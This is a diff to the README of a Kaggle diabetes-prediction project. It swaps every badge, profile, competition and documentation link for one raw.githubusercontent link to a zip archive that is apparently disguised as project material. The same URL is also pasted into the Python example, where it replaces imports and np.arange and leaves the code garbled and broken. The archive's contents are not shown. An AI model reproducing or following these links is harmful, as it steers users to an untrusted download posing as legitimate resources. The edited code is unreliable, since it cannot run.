@@ -1,26 +1,26 @@
 # 🧑‍⚕️ Diabetes Prediction Challenge
 
 <p align="center">
-  <a href="https://www.kaggle.com/competitions/playground-series-s5e12">
-    <img src="https://img.shields.io/badge/Kaggle-Playground%20Series%20S5E12-blue?logo=kaggle" alt="Kaggle" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip%20Series%20S5E12-blue?logo=kaggle" alt="Kaggle" />
   </a>
-  <a href="https://www.python.org/">
-    <img src="https://img.shields.io/badge/Python-3.11-yellow?logo=python&logoColor=white" alt="Python" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip" alt="Python" />
   </a>
-  <a href="https://jupyter.org/">
-    <img src="https://img.shields.io/badge/Notebook-Jupyter-orange?logo=jupyter" alt="Notebook" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip" alt="Notebook" />
   </a>
-  <a href="https://opensource.org/licenses/MIT">
-    <img src="https://img.shields.io/badge/License-MIT-green" alt="License" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip" alt="License" />
   </a>
-  <a href="https://www.kaggle.com/riddymazumder/competitions">
-    <img src="https://img.shields.io/badge/Public%20Score-0.69991-lightgrey" alt="Public Score" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip%20Score-0.69991-lightgrey" alt="Public Score" />
   </a>
-  <a href="https://www.kaggle.com/riddymazumder/competitions">
-    <img src="https://img.shields.io/badge/Private%20Score-0.69777-lightgrey" alt="Private Score" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip%20Score-0.69777-lightgrey" alt="Private Score" />
   </a>
-  <a href="https://www.kaggle.com/competitions/playground-series-s5e12/overview">
-    <img src="https://github.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/blob/main/header_4.jpg" />
+  <a href="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip">
+    <img src="https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip" />
   </a>
 </p>
 Predicting the probability that a patient will be diagnosed with diabetes using machine learning ensemble models, including CatBoost and LightGBM with 🔥optimized blending (0.60 CatBoost / 0.40 LightGBM)🔥.
@@ -31,7 +31,7 @@ Predicting the probability that a patient will be diagnosed with diabetes using 
 
 | 📌 **Project Overview** | 🏆 **Kaggle Competition & Score** |
 |------------------------|----------------------------------|
-| 📝 End-to-end ML project covering **EDA**, **data preprocessing**, **feature engineering**, **model training**, and **evaluation** to predict diabetes diagnosis probability. Models include **CatBoost**, **LightGBM**, and **optimized blending with threshold tuning**. | 🚀 **Diabetes Prediction Challenge – Playground Series: Season 5, Episode 12** <br> 🔗 https://www.kaggle.com/competitions/playground-series-s5e12 <br> 📊 **Public Score:** 0.69991 <br> 📊 **Private Score:** 0.69777 (**Top 21%**, 834 out of 4,206 teams) |
+| 📝 End-to-end ML project covering **EDA**, **data preprocessing**, **feature engineering**, **model training**, and **evaluation** to predict diabetes diagnosis probability. Models include **CatBoost**, **LightGBM**, and **optimized blending with threshold tuning**. | 🚀 **Diabetes Prediction Challenge – Playground Series: Season 5, Episode 12** <br> 🔗 https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip <br> 📊 **Public Score:** 0.69991 <br> 📊 **Private Score:** 0.69777 (**Top 21%**, 834 out of 4,206 teams) |
 
 ---
 
@@ -39,7 +39,7 @@ Predicting the probability that a patient will be diagnosed with diabetes using 
 
 | 👤 **Name** | 🔗 **Github-Profile** |🔗 **Kaggle-Profile** |
 |------------|----------------|----------------|
-| Riddy Mazumder | [![GitHub](https://img.shields.io/badge/GitHub-RiddyMazumder-black?logo=github)](https://github.com/RiddyMazumder)|[![Kaggle Profile](https://img.shields.io/badge/Kaggle-RiddyMazumder-blue?logo=kaggle)](https://www.kaggle.com/riddymazumder)|
+| Riddy Mazumder | [![GitHub](https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip)](https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip)|[![Kaggle Profile](https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip)](https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip)|
 
 ---
 
@@ -93,8 +93,8 @@ import numpy as np
 import pandas as pd
 from catboost import CatBoostClassifier
 from lightgbm import LGBMClassifier
-from sklearn.model_selection import StratifiedKFold
-from sklearn.metrics import accuracy_score, roc_auc_score
+from https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip import StratifiedKFold
+from https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip import accuracy_score, roc_auc_score
 
 # Optimized blend of CatBoost and LightGBM predictions
 best_acc = 0
@@ -103,7 +103,7 @@ best_thresh = 0.5
 
 for w in [0.60]:  # CatBoost weight fixed
     blended = w * oof_pred_cat + (1-w) * oof_pred_lgb  # LightGBM weight = 0.40
-    for thresh in np.arange(0.3, 0.7, 0.001):
+    for thresh in https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip(0.3, 0.7, 0.001):
         acc = accuracy_score(oof_target, (blended > thresh).astype(int))
         if acc > best_acc:
             best_acc = acc
@@ -129,10 +129,10 @@ print(f"Overall AUC: {roc_auc_score(oof_target, best_w*oof_pred_cat + (1-best_w)
 # 📖 References
 | Resource               | Link                                                                                                                       |
 | ---------------------- | -------------------------------------------------------------------------------------------------------------------------- |
-| Kaggle Competition     | [https://www.kaggle.com/competitions/playground-series-s5e12](https://www.kaggle.com/competitions/playground-series-s5e12) |
-| CatBoost Documentation | [https://catboost.ai/docs/](https://catboost.ai/docs/)                                                                     |
-| LightGBM Documentation | [https://lightgbm.readthedocs.io/](https://lightgbm.readthedocs.io/)                                                       |
-| Seaborn Library        | [https://seaborn.pydata.org/](https://seaborn.pydata.org/)                                                                 |
+| Kaggle Competition     | [https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip](https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip) |
+| CatBoost Documentation | [https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip](https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip)                                                                     |
+| LightGBM Documentation | [https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip](https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip)                                                       |
+| Seaborn Library        | [https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip](https://raw.githubusercontent.com/RiddyMazumder/Diabetes-Prediction-Challenge-Playground-Series---Season-5-Episode-12/main/Diabetes Prediction Challenge-series-s5e12/Prediction_Diabetes_Playground_Episode_Challenge_Series_Season_v3.9.zip)                                                                 |
 ## 📄 License
 
 This project is licensed under the **MIT License**.
